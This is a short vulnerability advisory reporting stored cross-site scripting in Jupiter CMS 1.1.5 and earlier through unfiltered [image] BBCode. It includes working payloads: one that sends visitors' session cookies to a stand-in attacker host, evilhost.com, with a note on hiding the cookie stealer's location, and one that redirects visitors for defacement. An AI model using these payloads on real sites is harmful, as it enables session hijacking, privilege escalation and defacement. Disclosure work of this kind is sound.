Jupiter CMS <= 1.1.5 multiple XSS attack vectors.

Discovered by: Nomenumbra/[0x4F4C] Date: 3/11/2006 impact:high (privilege escalation,site defacement)

Jupiter CMS (http://www.highstrike.net/) is a dynamic CMS system like mambo or limbo, allowing users
to subscribe and posts events. Because no filtering is done upon [image] BBcode input, any user is
capable of inserting arbitrary javascript code, allowing for credential theft leading/session
hijacking and possibly site defacement.

Examples:

This would make a messagebox pop up saying &#039;XSS&#039;, whenever the events get loaded (on the main page,
calender,etc): [image=javascript:alert(&#039;XSS&#039;)]

This would allow an attacker to steal session ID&#039;s, which he could insert into his own cookie to
hijack sessions and elevate his/her privileges:

[image=javascript:window.navigate(&#039;http://www.evilhost.com/cookiestealer.php?c=&#039;+document.cookie)]

It would be used with SjaakRake&#039;s cookie stealer, with maybe
the addition of a header("location: ".<anythinghere>), to redirect the user to a page of your choice,
to avoid suspicion and disclosure of your cookiestealer&#039;s location.

This injections would allow an attacker to redirect users to a page of his choice, effectively
defacing the page:

[image=javascript:window.navigate(&#039;http://www.evilhost.com/pwned.html&#039;)]

As you can see the possibilities are limitless, as long as you have a bit of fantasy!
